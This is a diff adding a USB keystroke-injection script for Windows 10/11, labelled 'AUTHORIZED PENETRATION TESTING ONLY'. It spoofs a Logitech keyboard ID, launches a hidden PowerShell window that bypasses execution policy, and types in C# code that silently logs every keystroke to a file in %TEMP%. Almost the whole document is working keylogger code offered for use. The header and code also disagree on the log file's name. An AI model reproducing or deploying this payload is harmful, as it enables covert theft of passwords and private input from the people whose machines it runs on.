@@ -1,0 +1,38 @@
+REM Title: PowerShell Keylogger
+REM Author: Community
+REM Target: Windows 10/11
+REM Description: Starts a PowerShell-based keylogger - AUTHORIZED TESTING ONLY
+REM Logs to %TEMP%\keylog.txt
+REM AUTHORIZED PENETRATION TESTING ONLY
+REM
+ID 046D:C31C Logitech USB Keyboard
+
+DELAY 1500
+
+GUI r
+DELAY 600
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+
+STRING $logfile="$env:TEMP\kl.txt"; Add-Type -TypeDefinition @'
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+public class KL {
+ [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
+ [DllImport("user32.dll")] public static extern int GetKeyboardLayout(int idThread);
+ public static void Start(string log) {
+  while(true) {
+   for(int i=32;i<127;i++) {
+    if((GetAsyncKeyState(i) & 1) == 1) {
+     File.AppendAllText(log, ((char)i).ToString());
+    }
+   }
+   System.Threading.Thread.Sleep(20);
+  }
+ }
+}
+'@; [KL]::Start($logfile)
+ENTER
